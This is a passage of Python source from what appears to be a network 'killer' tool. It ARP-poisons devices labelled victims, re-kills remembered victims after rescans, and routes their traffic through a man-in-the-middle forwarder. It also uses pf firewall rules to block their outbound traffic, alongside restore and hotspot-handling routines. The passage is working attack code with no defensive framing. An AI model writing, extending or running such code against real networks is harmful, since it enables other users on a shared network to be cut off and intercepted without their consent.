            ics = victim_on_clumsy_ics_subnet(ip)
            if ics and scanner is not None and apply_clumsy_ics_router_context:
                try:
                    apply_clumsy_ics_router_context(scanner, self, ip)
                except Exception:
                    pass
            self._sync_iface_for_victim(victim, refresh_router=not ics)
            if ics:
                self.unkill(victim, ics_mode=True)
                if scanner is not None and heal_ics_client_after_mitm:
                    try:
                        heal_ics_client_after_mitm(scanner, self, victim)
                    except Exception:
                        pass
                continue
            # Same restore path as per-device OFF (Wi‑Fi broadcast + honest hwsrc).
            self.unkill(victim, ics_mode=False)
        for ip in list(self.pf_blocks):
            self._remove_pf_block(ip)
        # Close persistent socket when done
        self._close_socket()
    
    def store(self):
        """
        Save a copy of previously killed devices
        """
        self.storage = dict(self.killed)
    
    def release(self):
        """
        Remove the stored copy of killed devices
        """
        self.storage = {}
    
    def rekill_stored(self, new_devices):
        """
        Re-kill old devices in self.storage
        """
        try:
            from tools.ics_impairment_policy import should_restore_remembered_kill
        except Exception:
            should_restore_remembered_kill = lambda _d, _s=None: True  # type: ignore

        for mac, old in self.storage.items():
            for new in new_devices:
                # Update old killed with newer ip
                if old['mac'] == new['mac']:
                    old['ip'] = new['ip']
                    break

            # Update new_devices with those it does not have
            if old not in new_devices:
                new_devices.append(old)

            if not should_restore_remembered_kill(old):
                continue
            self.kill(old)

    def one_way_kill(self, victim):
        """
        Kill victim and block their outbound traffic.
        Uses kernel IP forwarding + pf block (fast, no Python overhead).
        
        With sysctl net.inet.ip.forwarding=1:
        - ARP spoof redirects traffic through us
        - Kernel forwards packets at native speed
        - pf blocks outbound from victim (kernel level, instant)
        """
        # Ensure victim is being ARP poisoned
        if victim['mac'] not in self.killed:
            self.kill(victim)
            # Wait for poison to start
            for _ in range(10):
                sleep(0.1)
                if victim['mac'] in self.killed:
                    break
        
        # Block outbound at kernel level with pf (no slow Python forwarder)
        self._enforce_pf_block(victim['ip'])

    def _start_one_way_forwarder(self, victim, debug=False):
        if victim['mac'] in self.forwarders:
            self.forwarders[victim['mac']].stop()
        if not self.router.get('mac'):
            if debug:
                print(f"[killer] Cannot start forwarder: router MAC unknown")
            return
        iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
        if not iface_to_use or iface_to_use == 'NULL':
            if debug:
                print(f"[killer] Cannot start forwarder: invalid interface")
            return
        fw = MitmForwarder(debug=debug)
        fw.start(
            victim=victim,
            router=self.router,
            iface_name=iface_to_use,
            iface_mac=self.iface.mac,
            drop_from_victim=True,
            drop_to_victim=False,
        )
        self.forwarders[victim['mac']] = fw
        if debug:
            print(f"[killer] Forwarder started for {victim['ip']}")
    
    def get_forwarder_stats(self, mac):
        """Get stats for a specific forwarder"""
        fw = self.forwarders.get(mac)
        if fw:
            return fw.get_stats()
        return None

    def _stop_forwarder(self, mac):
        fw = self.forwarders.pop(mac, None)
        if fw:
            fw.stop()
        # Keep kernel forwarding OFF when idle so the next Kill cannot leak through
        # a failed disable. Never yank forwarding under Clumsy/ICS hotspot sharing.
        if not self.forwarders and not self.killed:
            try:
                from tools.clumsy_inline import ics_forwarding_must_stay_on

                if ics_forwarding_must_stay_on():
                    return
            except Exception:
                pass
            disable_ip_forwarding()

    def _enforce_pf_block(self, victim_ip: str):
        if victim_ip in self.pf_blocks:
            return
        if ensure_pf_enabled() and install_anchor():
            if block_all_for(self.iface.name, victim_ip):
                self.pf_blocks.add(victim_ip)

    def _remove_pf_block(self, victim_ip: str):
        if victim_ip not in self.pf_blocks:
            return
        if ensure_pf_enabled() and install_anchor():
            unblock_all_for(victim_ip)
        self.pf_blocks.discard(victim_ip)
